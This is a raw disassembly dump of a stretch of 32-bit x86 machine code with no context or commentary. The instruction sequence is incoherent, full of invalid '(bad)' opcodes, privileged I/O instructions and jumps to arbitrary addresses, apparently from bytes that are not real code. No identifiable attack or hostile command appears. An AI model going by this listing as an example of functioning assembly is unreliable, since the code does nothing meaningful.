  40b90e:	sub    ah,BYTE PTR [esi+0x75]
  40b911:	sub    eax,DWORD PTR [edi-0x77560ea8]
  40b917:	ret    
  40b918:	es loop 0x40b980
  40b91b:	fimul  DWORD PTR [ebp+0x41]
  40b91e:	icebp  
  40b91f:	inc    ebp
  40b920:	scas   eax,DWORD PTR es:[edi]
  40b921:	xor    eax,0xdef4f543
  40b926:	pop    ecx
  40b927:	sbb    eax,0x663cc0da
  40b92c:	fld    DWORD PTR [ebp-0x42cbdddf]
  40b932:	in     eax,dx
  40b933:	out    0xdf,eax
  40b935:	in     eax,0x78
  40b937:	inc    esi
  40b938:	or     BYTE PTR [eax],0x2c
  40b93b:	cmp    bl,bh
  40b93d:	dec    ecx
  40b93e:	fisttp WORD PTR [edx]
  40b940:	pop    eax
  40b941:	(bad)  
  40b942:	fistp  DWORD PTR [eax]
  40b944:	push   eax
  40b945:	stos   BYTE PTR es:[edi],al
  40b946:	sbb    al,0x40
  40b948:	xchg   esi,eax
  40b949:	mov    al,0x57
  40b94b:	cld    
  40b94c:	test   al,0xc6
  40b94e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40b94f:	fyl2xp1 
  40b951:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40b952:	enter  0xd552,0xe9
  40b956:	dec    eax
  40b957:	and    eax,0xfc18c31
  40b95c:	cmp    ch,bl
  40b95e:	popa   
  40b95f:	xchg   ebp,eax
  40b960:	mov    cl,0x50
  40b962:	fst    QWORD PTR [ecx]
  40b964:	and    eax,0xe91f1908
  40b969:	scas   eax,DWORD PTR es:[edi]
  40b96a:	rol    esp,0xec
  40b96d:	cmp    al,0x52
  40b970:	adc    eax,0x5869bce3
  40b975:	ss scas al,BYTE PTR es:[edi]
  40b977:	aaa    
  40b978:	dec    BYTE PTR [ecx-0x4a]
  40b97b:	xchg   ebp,eax
  40b97c:	clc    
  40b97d:	xor    dh,BYTE PTR [ebp-0x25]
  40b980:	aaa    
  40b981:	out    0xc6,al
  40b983:	push   ds
  40b984:	adc    DWORD PTR [esi+0x75],0xcad24f51
  40b98b:	mov    ds:0x7fa195ef,al
  40b990:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40b991:	add    dh,dl
  40b993:	sahf   
  40b994:	pop    ecx
  40b995:	mov    edi,0x90c4e723
  40b99a:	test   al,0xc5
  40b99c:	jne    0x40b9f1
  40b99e:	out    dx,al
  40b99f:	cmp    BYTE PTR [ebx+0x6c480df7],ah
  40b9a5:	ins    BYTE PTR es:[edi],dx
  40b9a6:	push   eax
  40b9a7:	sbb    ecx,ebx
  40b9a9:	jmp    0x40b9af
  40b9ab:	loopne 0x40b9c4
  40b9ad:	jge    0x40b9cd
  40b9af:	fdivr  st,st(2)
  40b9b1:	add    esp,ebx
  40b9b3:	add    BYTE PTR [ebp+0x743da95f],0xa
  40b9ba:	sahf   
  40b9bb:	loope  0x40ba09
  40b9bd:	repnz dec edi
  40b9bf:	fwait
  40b9c0:	cmp    BYTE PTR [edi-0x70],dl
  40b9c3:	test   ebp,esp
  40b9c5:	xchg   ecx,eax
  40b9c6:	sbb    al,0xdc
  40b9c8:	loop   0x40ba10
  40b9ca:	lods   eax,DWORD PTR ds:[esi]
  40b9cb:	call   0x794e6d58
  40b9d0:	pop    es
  40b9d1:	(bad)  
  40b9d2:	mov    al,ds:0x499651e4
  40b9d7:	sbb    BYTE PTR [ebp+ecx*2+0xbc5f5fe],bl
  40b9de:	xchg   ecx,eax
  40b9df:	xor    ebx,eax
  40b9e1:	mov    gs,WORD PTR [ecx]
  40b9e3:	xlat   BYTE PTR ds:[ebx]
  40b9e4:	lods   eax,DWORD PTR ds:[esi]
  40b9e5:	repnz data16 ins BYTE PTR es:[edi],dx
  40b9e8:	mov    WORD PTR [edx-0x21],ax
  40b9ec:	aam    0x5b
  40b9ee:	frstor [ebx+0x34ba93cb]
  40b9f4:	push   esi
  40b9f5:	daa    
  40b9f6:	cmp    al,0xbf
  40b9f8:	cdq    
  40b9f9:	mov    ch,0xe2
  40b9fb:	cs sahf 
  40b9fd:	jmp    0x7000023f
  40ba02:	int3   
  40ba03:	jno    0x40b9c5
  40ba05:	scas   al,BYTE PTR es:[edi]
  40ba06:	cld    
  40ba07:	adc    dl,dl
  40ba09:	fsubr  DWORD PTR [edx-0x51]
  40ba0c:	(bad)  
  40ba0d:	add    DWORD PTR [eax+eax*1-0x6e],esi
  40ba11:	dec    eax
  40ba12:	inc    edi
  40ba13:	sub    DWORD PTR [edi],esi
  40ba15:	les    esi,FWORD PTR [ecx+0x31]
  40ba18:	adc    bh,BYTE PTR [ecx]
  40ba1a:	wbinvd 
  40ba1c:	arpl   WORD PTR [eax+0x45b82697],dx
  40ba22:	sbb    BYTE PTR [edx+edx*8],ah
  40ba25:	inc    esp
  40ba26:	sub    BYTE PTR [eax+0x64],bl
  40ba29:	adc    BYTE PTR [ebp+0x39],dh
  40ba2c:	into   
  40ba2d:	cmp    DWORD PTR [ebx],eax
  40ba2f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40ba30:	jecxz  0x40ba61
  40ba32:	out    0xbb,al
  40ba34:	mov    dh,0x44
  40ba36:	jg     0x40b9f1
  40ba38:	xor    eax,0x5ff0de85
  40ba3d:	(bad)  
  40ba3e:	scas   eax,DWORD PTR es:[edi]
  40ba3f:	aaa    
  40ba40:	dec    eax
  40ba41:	inc    ecx
  40ba42:	cmp    eax,0x8cd373aa
  40ba47:	addr16 add eax,0x620f1793
  40ba4d:	test   edx,ebp
  40ba4f:	rcl    BYTE PTR [esi-0x49],1
  40ba52:	cmp    al,0x17
  40ba54:	push   eax
  40ba55:	sbb    BYTE PTR [esi],0x71
  40ba58:	dec    ebp
  40ba59:	jl     0x40ba2d
  40ba5b:	pop    ss
  40ba5c:	inc    ecx
  40ba5d:	test   BYTE PTR [ebx+edx*2+0x2b],bl
  40ba61:	pop    ss
  40ba62:	push   ebp
  40ba63:	xchg   edi,eax
  40ba64:	or     bh,BYTE PTR [esi+0x7516b964]
  40ba6a:	mov    al,0x13
  40ba6c:	pop    ebp
  40ba6d:	adc    BYTE PTR [edx+edi*2+0x15],al
  40ba71:	mov    al,ds:0xac47fa4
  40ba76:	icebp  
  40ba77:	ret    
  40ba78:	(bad)  
  40ba79:	shr    BYTE PTR [eax],cl
  40ba7b:	mov    ds:0x87b1d2e7,al
  40ba80:	mov    bl,0xed
  40ba82:	mov    edi,ds
  40ba84:	sbb    al,0xc5
  40ba86:	dec    edi
  40ba87:	mov    BYTE PTR [ebp+0x73],dh
  40ba8a:	repz push ds
  40ba8c:	call   0x3d6354e3
  40ba91:	lods   eax,DWORD PTR ds:[esi]
  40ba92:	mov    eax,0x8fc09394
  40ba97:	ins    BYTE PTR es:[edi],dx
  40ba98:	mov    al,0xd7
  40ba9a:	popa   
  40ba9b:	adc    BYTE PTR [ecx+eiz*4],ah
  40ba9e:	add    al,0x30
  40baa0:	inc    ebx
  40baa1:	enter  0x42d9,0x60
  40baa5:	jb     0x40bab7
  40baa7:	jbe    0x40ba93
  40baa9:	clc    
  40baaa:	lods   al,BYTE PTR ds:[esi]
  40baab:	dec    edi
  40baac:	and    esp,DWORD PTR [eax]
  40baae:	cmp    al,0x51
  40bab0:	test   BYTE PTR [ebx],ah
  40bab2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40bab3:	inc    BYTE PTR [edx-0x4c]
  40bab6:	stos   DWORD PTR es:[edi],eax
  40bab7:	cmp    al,0x27
  40bab9:	and    ebx,ebp
  40babb:	sbb    BYTE PTR [ecx-0x4155c97a],cl
  40bac1:	push   eax
  40bac2:	mov    dh,0xee
  40bac4:	loop   0x40bb35
  40bac6:	jb     0x40ba53
  40bac8:	inc    esp
  40bac9:	inc    eax
  40baca:	gs ins DWORD PTR es:[edi],dx
  40bacc:	add    esi,eax
  40bace:	popa   
  40bacf:	call   0x5e048450
  40bad4:	inc    esi
  40bad5:	dec    ebp
  40bad6:	mov    edi,0x87559f21
  40badb:	push   ds
  40badc:	dec    esp
  40badd:	or     bh,BYTE PTR [ebx+0x4c7d36c]
  40bae3:	xor    esi,DWORD PTR [ebx+0x2]
  40bae6:	popf   
  40bae7:	and    eax,0x9544d34c
  40baec:	bnd jno 0x40ba70
  40baef:	mov    BYTE PTR [ebp-0x36039fc7],al
  40baf5:	sahf   
  40baf6:	arpl   WORD PTR [ecx+0xe102229],di
  40bafc:	aam    0x49
  40bafe:	xor    al,BYTE PTR [edi+0x25]
  40bb01:	bound  esp,QWORD PTR [ecx]
  40bb03:	mov    bh,0xa0
  40bb05:	inc    eax
  40bb06:	lods   eax,DWORD PTR ds:[esi]
  40bb07:	jb     0x40bb2c
  40bb09:	mov    ds:0xc426ed59,eax
  40bb0e:	ins    BYTE PTR es:[edi],dx
  40bb0f:	and    DWORD PTR [ebx+0x4c],eax
  40bb12:	je     0x40bb58
  40bb14:	ret    
  40bb15:	repz enter 0x41b,0x66
  40bb1a:	je     0x40baaf
  40bb1c:	fidiv  WORD PTR [edi]
  40bb1e:	sbb    bl,BYTE PTR [edi]
  40bb20:	out    dx,eax
  40bb21:	popa   
  40bb22:	inc    edx
  40bb23:	mov    al,ds:0x745d280d
  40bb28:	jb     0x40bb9f
  40bb2a:	xchg   edx,eax
  40bb2b:	jb     0x40bb27
  40bb2d:	mov    ds:0xa6125668,al
  40bb32:	sub    DWORD PTR [ecx+0x36e09809],eax
  40bb38:	sbb    BYTE PTR [eax-0x33090dd4],dh
  40bb3e:	in     al,0xdd
  40bb40:	jg     0x40bad7
  40bb42:	sbb    BYTE PTR [edi+0x35452163],bh
  40bb48:	pushf  
  40bb49:	scas   al,BYTE PTR es:[edi]
  40bb4a:	test   DWORD PTR [edi+ebx*8-0x94b5a54],ecx
  40bb51:	repnz (bad) 
  40bb53:	and    BYTE PTR [esi+0x6307c91d],ah
  40bb59:	(bad)  
  40bb5a:	imul   esi,DWORD PTR [edx-0x33f95ac6],0x75
  40bb61:	adc    al,0xcf
  40bb63:	xchg   ecx,eax
  40bb64:	push   ss
  40bb65:	mov    cl,0x81
  40bb67:	adc    al,0x8a
  40bb69:	sub    ebp,esi
  40bb6b:	push   0x14
  40bb6d:	push   edi
  40bb6e:	(bad)  
  40bb6f:	scas   eax,DWORD PTR es:[edi]
  40bb70:	mov    dh,BYTE PTR [eax-0x21]
  40bb73:	dec    eax
  40bb74:	mov    bl,0x0
  40bb76:	mov    edi,0x1d1800f9
  40bb7b:	or     bh,bl
  40bb7d:	loope  0x40bbc0
  40bb7f:	mov    bl,0x85
  40bb81:	sbb    al,BYTE PTR [edx+0xaa94f19]
  40bb87:	test   eax,0x74defc08
  40bb8c:	fadd   st(4),st
  40bb8e:	sahf   
  40bb8f:	cli    
  40bb90:	cmp    ebx,DWORD PTR [ebp-0x58]
  40bb93:	adc    BYTE PTR [edi+0x3c520744],bh
  40bb99:	or     BYTE PTR [ebp+0xf],bh
  40bb9c:	and    BYTE PTR [edi],dl
  40bb9e:	int    0x68
  40bba0:	in     al,0xb8
  40bba2:	xchg   esi,eax
  40bba3:	xchg   BYTE PTR [edi+0x1c],dl
  40bba6:	sbb    esp,edi
  40bba8:	and    dh,BYTE PTR [edi+0x7e648551]
  40bbae:	fcmovnbe st,st(0)
  40bbb0:	loope  0x40bbe7
  40bbb2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40bbb3:	mov    dh,0x18
  40bbb5:	out    dx,eax
  40bbb6:	mov    ecx,0x3fe29bbb
  40bbbb:	jl     0x40bbd0
  40bbbd:	iret   
  40bbbe:	es hlt 
  40bbc0:	jmp    0xe847:0x555b5738
  40bbc7:	push   esi
  40bbc8:	imul   esi,eax,0xffffff8c
  40bbcb:	and    ah,cl
  40bbcd:	mov    edi,0x31f6f955
  40bbd2:	cmp    BYTE PTR [edx+eiz*2],bh
  40bbd5:	rcl    DWORD PTR [ebx+0x66],0x39
  40bbd9:	pop    esp
  40bbdb:	fs pop esp
  40bbdd:	mov    esi,0x922d2c2b
  40bbe2:	inc    esi
  40bbe3:	ds addr16 xor ebp,ecx
  40bbe7:	xchg   esi,eax
  40bbe8:	push   ds
  40bbe9:	ret    
  40bbea:	fstp   TBYTE PTR [edi]
  40bbec:	add    DWORD PTR [ebp-0x1],ebp
  40bbef:	test   DWORD PTR [ecx-0x76],ecx
  40bbf2:	retf   
  40bbf3:	dec    edx
  40bbf4:	and    DWORD PTR [edi+0x33],ebp
  40bbf7:	pop    ds
  40bbf8:	ss iret 
  40bbfa:	cmp    ebp,edi
  40bbfc:	add    DWORD PTR [ebx+0x78e415e2],edi
  40bc02:	js     0x40bc53
  40bc04:	or     eax,0xd15d866b
  40bc09:	fwait
  40bc0a:	(bad)  
  40bc0b:	fiadd  WORD PTR [ecx+0x188d14d3]
  40bc11:	pop    ebx
  40bc12:	(bad)  
  40bc13:	js     0x40bbad
  40bc15:	sbb    al,0x4b
  40bc17:	rol    edx,cl
  40bc19:	jmp    0x40bc6d
  40bc1b:	mov    al,ds:0xcc401bee
  40bc20:	push   ecx
  40bc21:	sub    dl,BYTE PTR [ebx]
  40bc23:	addr16 push edx
  40bc25:	outs   dx,DWORD PTR ds:[esi]
  40bc26:	cmc    
  40bc27:	mov    edx,0xd97381fb
  40bc2c:	cdq    
  40bc2d:	push   0x14
  40bc2f:	inc    edx
  40bc30:	adc    edi,DWORD PTR [ebp-0x1d]
  40bc33:	retf   0xae9f
  40bc36:	cld    
  40bc37:	test   eax,0xc49c6c0d
  40bc3c:	ror    DWORD PTR [edx-0x20],cl
  40bc3f:	repz jg 0x40bbd4
  40bc42:	cmp    eax,0x47ee31c
  40bc47:	pop    edx
  40bc48:	and    ebx,DWORD PTR [esi]
  40bc4a:	cmp    DWORD PTR [ebp+0x6478544e],eax
  40bc50:	sbb    BYTE PTR [ebp+0x2c],al
  40bc53:	dec    edi
  40bc54:	fnstenv [eax]
  40bc56:	into   
  40bc57:	mov    ebx,0x6733cd34
  40bc5c:	xor    bh,BYTE PTR [esi+0x39f9f73a]
  40bc62:	repz (bad) 
  40bc64:	sub    DWORD PTR [ebx+0x2c],ebx
  40bc67:	retfw  0xa99
  40bc6b:	mov    ds:0x19dbb8,eax
  40bc70:	and    eax,0x4be07f1
  40bc75:	inc    ebx
  40bc76:	jge    0x40bbfc
  40bc78:	mov    ss,ecx
  40bc7a:	popa   
  40bc7b:	xchg   esi,eax
  40bc7c:	stc    
  40bc7d:	pop    ds
  40bc7e:	mov    ebp,0xdf0baff2
  40bc83:	jmp    0x6119:0x89a5a9b5
  40bc8a:	cwde   
  40bc8b:	pop    ds
  40bc8c:	aaa    
  40bc8d:	ins    DWORD PTR es:[edi],dx
  40bc8e:	jle    0x40bc59
  40bc90:	xchg   ebp,eax
  40bc91:	add    ah,BYTE PTR [edx+0xe]
  40bc94:	jmp    0xfa181568
  40bc99:	cmp    eax,0x3e121068
  40bc9e:	mov    al,0x4
  40bca0:	arpl   WORD PTR [esi-0x67cc4240],bx
  40bca6:	bnd jns 0x40bc9b
  40bca9:	pop    eax
  40bcaa:	and    BYTE PTR [ebp+0x7349008a],bh
  40bcb0:	jp     0x40bc37
  40bcb2:	add    al,0x8
  40bcb4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40bcb5:	mov    esp,0x811f2595
  40bcba:	stos   DWORD PTR es:[edi],eax
  40bcbb:	pop    es
  40bcbc:	cli    
  40bcbd:	retf   
  40bcbe:	inc    BYTE PTR ds:0x72eb3da6
  40bcc4:	popf   
  40bcc5:	ss cmp al,0x73
  40bcc8:	sub    al,0x5f
  40bcca:	lods   al,BYTE PTR ds:[esi]
  40bccb:	retf   
  40bccc:	mov    ebx,0xf31bc381
  40bcd1:	jae    0x40bd00
  40bcd3:	jae    0x40bcf9
  40bcd5:	bound  esp,QWORD PTR [ebx+0x5906383e]
  40bcdb:	pop    ebx
  40bcdc:	sbb    BYTE PTR [edx+0x25690fc2],cl
  40bce2:	xor    al,0x20
  40bce4:	jp     0x40bc8a
  40bce6:	arpl   WORD PTR [ecx],bx
  40bce8:	push   eax
  40bce9:	ins    DWORD PTR es:[edi],dx
  40bcea:	cmp    dl,BYTE PTR [bx]
  40bced:	push   es
  40bcee:	and    eax,0x6d3806c0
  40bcf3:	inc    eax
  40bcf4:	xchg   BYTE PTR [esi],bh
  40bcf6:	cwde   
  40bcf7:	shl    bl,1
  40bcf9:	lea    edx,ds:0x50daca54
  40bcff:	cmp    DWORD PTR [ebx+ebp*1+0x6b0bad63],eax
  40bd06:	mov    al,ds:0xd2236515
  40bd0b:	push   edi
  40bd0c:	ret    0x7328
  40bd0f:	push   edi
  40bd10:	mov    WORD PTR [ebp+esi*4-0x4ed63926],?
  40bd17:	ins    BYTE PTR es:[edi],dx
  40bd18:	sub    eax,0x77380a84
  40bd1d:	sub    ch,BYTE PTR [ebx]
  40bd1f:	jg     0x40bcd6
  40bd21:	pop    es
  40bd22:	repnz les ebx,FWORD PTR [esi-0x7d9b5496]
  40bd29:	mov    ebp,0xcdc1533a
  40bd2e:	add    DWORD PTR [edi+0x34],edi
  40bd31:	xchg   esi,eax
  40bd32:	cdq    
  40bd33:	ins    DWORD PTR es:[edi],dx
  40bd34:	or     al,0x6c
  40bd36:	push   eax
  40bd37:	scas   eax,DWORD PTR es:[edi]
  40bd38:	mov    edx,DWORD PTR [eax+0x59f70f06]
  40bd3e:	cmp    eax,0x4f1436a0
  40bd43:	fld    TBYTE PTR [edx+0x62]
  40bd46:	call   0x17f7:0x522b15b3
  40bd4d:	cdq    
  40bd4e:	adc    dl,ah
  40bd50:	(bad)  [edx+ebp*2-0x18]
  40bd54:	es rdtsc 
  40bd57:	ss ss jb 0x40bd8e
  40bd5b:	xchg   edx,eax
  40bd5c:	sti    
  40bd5d:	(bad)  
  40bd5e:	icebp  
  40bd5f:	sub    al,0x78
  40bd61:	in     eax,0x9c
  40bd63:	inc    ebp
  40bd64:	iret   
  40bd65:	sbb    DWORD PTR [esi+ecx*4+0x36],ebx
  40bd69:	add    esi,esi
  40bd6b:	in     al,0xcc
  40bd6d:	mov    cl,0x1f
  40bd6f:	inc    edx
  40bd70:	cs daa 
  40bd72:	dec    ebx
  40bd73:	sub    DWORD PTR [esi-0x3ca062b],edx
  40bd79:	push   ecx
  40bd7a:	pop    eax
  40bd7b:	enter  0x2b1a,0x2e
  40bd7f:	pop    ss
  40bd80:	inc    edx
  40bd81:	das    
  40bd82:	mov    edx,0x8611f0d7
  40bd87:	sti    
  40bd88:	outs   dx,DWORD PTR ds:[esi]
  40bd89:	rcl    DWORD PTR [ebp-0x68184609],cl
  40bd8f:	mov    ebp,0x928832b2
  40bd94:	mov    bh,dh
  40bd96:	sahf   
  40bd97:	imul   edi,DWORD PTR [edx+0x2be5530d],0x4ad38c1b
  40bda1:	arpl   WORD PTR [esi-0x9e067f2],si
  40bda7:	mov    edi,0x7f6f06ff
  40bdac:	adc    bh,cl
  40bdae:	popa   
  40bdaf:	jge    0x40bdd5
  40bdb1:	dec    ecx
  40bdb2:	sbb    edi,DWORD PTR [ecx+eiz*1+0x517878d]
  40bdb9:	imul   DWORD PTR [edx-0x7127197b]
  40bdbf:	(bad)  
  40bdc0:	sbb    esi,edi
  40bdc2:	xchg   edx,eax
  40bdc3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40bdc4:	mov    eax,ds:0xf58de2
  40bdc9:	test   BYTE PTR fs:[esi+0x26],bl
  40bdcd:	and    BYTE PTR [eax-0x4c],bh
  40bdd0:	dec    esp
  40bdd1:	sub    DWORD PTR [edx+0x39],esp
  40bdd4:	scas   al,BYTE PTR es:[edi]
  40bdd5:	out    0x59,al
  40bdd7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40bdd8:	pop    ss
  40bdd9:	mov    eax,DWORD PTR [esp+ebx*2-0x68]
  40bddd:	fdivrp st(6),st
  40bddf:	xor    DWORD PTR [esp+edx*8],ebx
  40bde2:	out    dx,eax
  40bde3:	xchg   BYTE PTR [eax+0x69],bl
  40bde6:	mov    ds:0x594978dd,al
  40bdeb:	xchg   ecx,eax
  40bdec:	lds    ebp,FWORD PTR [edx-0x3d]
  40bdef:	das    
  40bdf0:	add    ecx,esp
  40bdf2:	inc    eax
  40bdf3:	out    dx,al
  40bdf4:	test   eax,0xe8ac4246
  40bdf9:	xchg   esi,eax
  40bdfa:	hlt    
  40bdfb:	sbb    BYTE PTR [eax+0xf],dh
  40bdfe:	retf   
  40bdff:	add    eax,DWORD PTR [esi]
  40be01:	(bad)  
  40be02:	jge    0x40be53
  40be04:	pop    edx
  40be05:	or     DWORD PTR [ecx],0x23481c40
  40be0b:	add    cl,dl
  40be0d:	adc    cl,BYTE PTR [edx+eax*4-0x5de1cfe2]
  40be14:	add    al,BYTE PTR [edi-0x20]
  40be17:	cmp    cl,BYTE PTR [edx]
  40be19:	add    ah,ch
  40be1b:	dec    ebx
  40be1c:	sbb    BYTE PTR [ebp-0x32ffb249],bh
  40be22:	and    DWORD PTR ss:[edx+0x57],edx
  40be26:	imul   ebx,DWORD PTR [edi+0x261e8e06],0xe2ae1ee8
  40be30:	stos   BYTE PTR es:[edi],al
  40be31:	outs   dx,DWORD PTR ds:[esi]
  40be32:	add    eax,0x2c2ea570
  40be37:	mov    edx,0x683f73e6
  40be3c:	mov    dl,0xc2
  40be3e:	fstp   st(7)
  40be40:	shr    cl,cl
  40be42:	stc    
  40be43:	xor    ebp,DWORD PTR [ebx]
  40be45:	adc    DWORD PTR [edi-0x4ff41fb2],esp
  40be4b:	bnd jno 0x40bdfb
  40be4e:	out    dx,eax
  40be4f:	xor    cl,dh
  40be51:	(bad)  
  40be53:	xor    al,0x8b
  40be55:	mov    gs,WORD PTR [edi]
  40be57:	gs xor al,0x48
  40be5a:	(bad)  
  40be5c:	loop   0x40be46
  40be5e:	sti    
  40be5f:	scas   eax,DWORD PTR es:[edi]
  40be60:	jle    0x40becb
  40be62:	xchg   ebx,eax
  40be63:	and    al,ah
  40be65:	das    
  40be66:	mov    esp,0x8267fd68
  40be6b:	pop    eax
  40be6c:	pop    ebp
  40be6d:	dec    ebp
  40be6e:	push   0xc
  40be70:	ficomp DWORD PTR [edx]
  40be72:	mov    ch,0x64
  40be74:	ffreep st(4)
  40be76:	adc    BYTE PTR [eax+0x39],dh
  40be79:	adc    al,0x7c
  40be7b:	xchg   ecx,eax
  40be7c:	fidiv  DWORD PTR [ebp-0x28]
  40be7f:	xor    eax,0x6e7a5301
  40be84:	mov    al,ds:0xcd36758e
  40be89:	jns    0x40beb3
  40be8b:	push   es
  40be8c:	(bad)  
  40be8d:	stc    
  40be8e:	ffreep st(1)
  40be90:	imul   ebx,DWORD PTR [edi+0x55bdf6ee],0x4b
  40be97:	not    BYTE PTR [esi+0x6e]
  40be9a:	push   es
  40be9b:	stos   DWORD PTR es:[edi],eax
  40be9c:	clc    
  40be9d:	jl     0x40bf0d
  40be9f:	call   0x42abccaa
  40bea4:	add    DWORD PTR [eax+0x39251c25],edi
  40beaa:	loop   0x40bea0
  40beac:	imul   eax,DWORD PTR [edx+0x59],0x27
  40beb0:	xchg   edi,eax
  40beb1:	call   0x943c:0x2154edf2
  40beb8:	rol    DWORD PTR [ebp-0x7f62c1db],0x5a
  40bebf:	daa    
  40bec0:	imul   edi,DWORD PTR [ebp+0x60],0xffffffa4
  40bec4:	jmp    0x6dc6:0x2b53f747
  40becb:	popa   
  40becc:	inc    edi
  40becd:	sbb    BYTE PTR [edi+0x64],dl
  40bed0:	or     edx,DWORD PTR [esi+ebx*1-0x23c7c8b6]
  40bed7:	xor    eax,0x84c34e86
  40bedc:	sub    edx,DWORD PTR [eax+edi*2-0xd9dc036]
  40bee3:	dec    BYTE PTR [esi]
  40bee5:	or     ch,al
  40bee7:	outs   dx,DWORD PTR ds:[esi]
  40bee8:	jns    0x40be98
  40beea:	(bad)  
  40beeb:	loopne 0x40bee5
  40beed:	ja     0x40bf28
  40beef:	imul   eax,DWORD PTR [esi+eax*8+0x18b6e116],0x4c
  40bef7:	jmp    DWORD PTR [edx]
  40bef9:	fwait
  40befa:	lods   al,BYTE PTR ds:[esi]
  40befb:	es push esi
  40befd:	scas   eax,DWORD PTR es:[edi]
  40befe:	fdivr  st(7),st
  40bf00:	gs xchg edx,eax
  40bf02:	in     al,0xf5
  40bf04:	jbe    0x40bedf
  40bf06:	sbb    DWORD PTR ds:0xcdcdca75,edx
  40bf0c:	loope  0x40beb4
  40bf0e:	mov    edx,0x883e7952
  40bf13:	ret    
  40bf14:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40bf15:	imul   eax,DWORD PTR [edx+0x3d],0xffffff9e
  40bf19:	and    al,0x25
  40bf1b:	js     0x40bf95
  40bf1d:	push   ecx
  40bf1e:	sbb    edx,ebp
  40bf20:	mov    dh,0x35
  40bf22:	std    
  40bf23:	xchg   ebx,eax
  40bf24:	push   cs
  40bf25:	icebp  
  40bf26:	lods   al,BYTE PTR ds:[esi]
  40bf27:	lahf   
  40bf28:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40bf29:	loope  0x40bf2e
  40bf2b:	cmp    esi,DWORD PTR [esp+edx*8-0x29]
  40bf2f:	xchg   DWORD PTR [ebp+0xeaecd1c],esp
  40bf35:	mov    al,ds:0xc0490475
  40bf3a:	jl     0x40bf48
  40bf3c:	lds    ebx,FWORD PTR [ebp-0x235505b0]
  40bf42:	inc    esi
  40bf43:	sbb    al,0x72
  40bf45:	dec    edi
  40bf46:	bound  ebp,QWORD PTR [edx]
  40bf48:	iret   
  40bf49:	inc    ecx
  40bf4a:	jae    0x40bfa4
  40bf4c:	clc    
  40bf4d:	mov    ds:0xe986a096,al
  40bf52:	or     cl,BYTE PTR [eax+0xc]
  40bf55:	sbb    eax,0x93a26f4b
  40bf5a:	adc    al,dh
  40bf5c:	add    bh,cl
  40bf5e:	or     DWORD PTR [edx-0x664b8410],esp
  40bf64:	pop    eax
  40bf65:	jmp    0xf930a324
  40bf6a:	js     0x40bfbc
  40bf6c:	rcl    BYTE PTR [edi],1
  40bf6e:	jmp    0x40bfd3
  40bf70:	icebp  
  40bf71:	or     eax,eax
  40bf73:	in     eax,dx
  40bf74:	add    DWORD PTR [ebx+0x1b24ed49],ecx
  40bf7a:	call   0x13bc86ce
  40bf7f:	pop    esp
  40bf80:	or     BYTE PTR [edx],dh
  40bf82:	out    dx,eax
  40bf83:	push   esi
  40bf84:	mov    al,ds:0x8d879311
  40bf89:	mov    ah,0x73
  40bf8b:	ror    BYTE PTR [ecx+0x3c6c6073],cl
  40bf91:	dec    esp
  40bf92:	mov    bl,BYTE PTR [ecx+0x6767229e]
  40bf98:	jno    0x40bff4
  40bf9a:	cmp    ecx,ebx
  40bf9c:	mov    ?,WORD PTR [esi+0x7b44b9e7]
  40bfa2:	ror    BYTE PTR [ebx+ebx*2+0x5717c450],cl
  40bfa9:	mov    edx,0x113c93d0
  40bfae:	xchg   ecx,eax
  40bfaf:	int    0x6a
  40bfb1:	shl    esp,cl
  40bfb3:	cmp    esp,DWORD PTR [ecx]
  40bfb5:	add    esp,esp
  40bfb7:	push   edx
  40bfb8:	pop    ss
  40bfb9:	add    dh,BYTE PTR [edi+0x3df48885]
  40bfbf:	sbb    eax,ebp
  40bfc1:	int    0xd1
  40bfc3:	enter  0x5dcc,0x57
  40bfc7:	mov    esp,0xcfcc643f
  40bfcc:	jecxz  0x40bf8b
  40bfce:	imul   ebp,esp,0xffffffa4
  40bfd1:	adc    al,0x36
  40bfd3:	mov    edi,0xddfc5d6c
  40bfd8:	ds cmc 
  40bfda:	iret   
  40bfdb:	mov    dl,0x63
  40bfdd:	clc    
  40bfde:	sub    al,0xb
  40bfe0:	icebp  
  40bfe1:	popa   
  40bfe2:	in     al,dx
  40bfe3:	test   ah,dl
  40bfe5:	int    0xe6
  40bfe7:	daa    
  40bfe8:	and    DWORD PTR [edx+edi*2+0x47],ecx
  40bfec:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40bfed:	mov    ds:0x82d4ea16,al
  40bff2:	icebp  
  40bff3:	and    DWORD PTR [esi-0x77],eax
  40bff6:	retf   
  40bff7:	sbb    al,0xf4
  40bff9:	imul   DWORD PTR [edi]
  40bffb:	je     0x40c01a
  40bffd:	pusha  
  40bffe:	iret   
  40bfff:	(bad)  
  40c001:	pop    esi
  40c002:	dec    edi
  40c003:	out    dx,al
  40c004:	xor    ah,BYTE PTR [edx-0x7b]
  40c007:	popa   
  40c008:	(bad)
  40c00c:	lds    ecx,FWORD PTR [ebx-0xc8dcb3d]
  40c012:	cdq    
  40c013:	push   eax
  40c014:	jmp    0x40c033
  40c016:	mov    ebp,0xe1a59571
  40c01b:	xor    eax,0x232551a
  40c020:	sbb    al,0x7c
  40c023:	or     BYTE PTR [ecx+esi*4-0x53395d54],dh
  40c02a:	push   ecx
  40c02b:	mov    eax,0x65af4f6e
  40c030:	cdq    
  40c031:	retf   
  40c032:	push   ecx
  40c033:	xlat   BYTE PTR ds:[ebx]
  40c034:	push   es
  40c035:	jge    0x40c00b
  40c037:	push   ss
  40c038:	mov    eax,0x34bc713f
  40c03d:	ret    
  40c03e:	ja     0x40c005
  40c040:	cmp    DWORD PTR [esi-0x615d8532],0x1339752e
  40c04a:	cs push cs
  40c04c:	mov    edx,0x2e78e74e
  40c051:	xchg   ah,al
  40c053:	lock aad 0x4c
  40c056:	cs cmp ebx,ebp
  40c059:	dec    eax
  40c05a:	lds    esi,FWORD PTR [ebx]
  40c05c:	das    
  40c05d:	mov    ah,0xfe
  40c05f:	xchg   ebp,eax
